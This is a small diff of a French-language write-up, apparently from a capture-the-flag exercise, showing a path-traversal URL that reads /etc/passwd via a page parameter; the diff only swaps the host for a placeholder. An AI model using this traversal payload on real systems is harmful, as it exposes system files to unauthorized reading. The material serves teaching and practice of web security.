@@ -10,7 +10,7 @@ On peut spécifier un chemin parent avec `../` et remonter d'un niveau dans le s
 On trouve le flag avec l'url:
 
 ```url
-  http://localhost:9784/index.php?page=../../../../../../../etc/passwd
+  http://[...]/index.php?page=../../../../../../../etc/passwd
 ```
 
 
